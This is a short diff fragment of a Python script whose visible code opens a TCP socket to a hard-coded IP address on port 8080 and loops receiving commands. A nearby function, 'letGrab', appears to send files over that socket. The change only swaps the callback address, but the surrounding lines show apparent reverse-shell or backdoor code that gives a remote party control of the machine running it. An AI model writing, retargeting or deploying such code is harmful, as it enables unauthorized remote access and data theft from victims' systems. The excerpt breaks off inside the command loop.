@@ -37,7 +37,7 @@ def letGrab(mysocket, path):
 def amalan():
     mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        mysocket.connect(("10.0.0.178",8080))
+        mysocket.connect(("10.3.131.213",8080))
 
         while True:
             cmd = mysocket.recv(1024).decode(errors='ignore').strip()
